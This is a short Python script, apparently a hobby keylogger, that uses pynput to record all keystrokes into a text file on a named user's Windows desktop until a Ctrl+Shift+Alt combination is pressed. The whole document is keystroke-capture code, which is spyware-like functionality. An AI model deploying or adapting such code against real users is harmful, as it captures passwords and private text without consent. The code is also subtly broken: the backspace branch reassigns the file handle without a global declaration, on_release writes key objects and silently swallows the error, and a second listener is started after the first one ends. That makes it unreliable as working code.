
from pynput import keyboard

# creating a new file named keys
keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "w")
keys.close()


close_combination = {keyboard.Key.ctrl_r,
                     keyboard.Key.shift_l, keyboard.Key.alt_l}
current = set()

keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "a")


def on_press(key):

    if key in close_combination:
        current.add(key)
        if all(k in current for k in close_combination):

            global keys  # to prevent unbound local error< I hope it is working now!
            keys.close()
            listener.stop()
    else:

        if key == keyboard.Key.space:
            keys.write(" ")

        elif key == keyboard.Key.backspace:
            keys.close()
            keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "r")
            data = keys.read()
            keys.close()
            keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "a")
            keys.truncate(len(data)-1)
        else:
            try:
                keys.write(key.char)
            except AttributeError:
                keys.write(format(key))


def on_release(key):
    try:
        current.remove(key)
    except KeyError:
        pass
    try:
        keys.write(key)
    except:
        pass


# Collect events until released<
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()


# ... or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
